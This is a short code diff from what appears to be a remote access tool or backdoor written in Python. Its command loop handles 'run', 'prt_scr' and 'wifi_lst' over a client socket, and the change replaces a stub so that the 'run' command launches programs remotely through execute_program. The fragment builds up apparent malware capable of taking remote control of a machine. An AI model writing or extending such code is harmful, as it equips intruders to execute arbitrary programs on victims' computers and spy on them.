@@ -41,7 +41,7 @@ def run(host, port):
                 if downloaded_data.startswith("[!] Error"):
                     continue
             elif command[:3] == "run":
-                pass
+                execute_program(client_socket, command[4:])
             elif command[:7] == "prt_scr":
                 pass
             elif command == "wifi_lst":
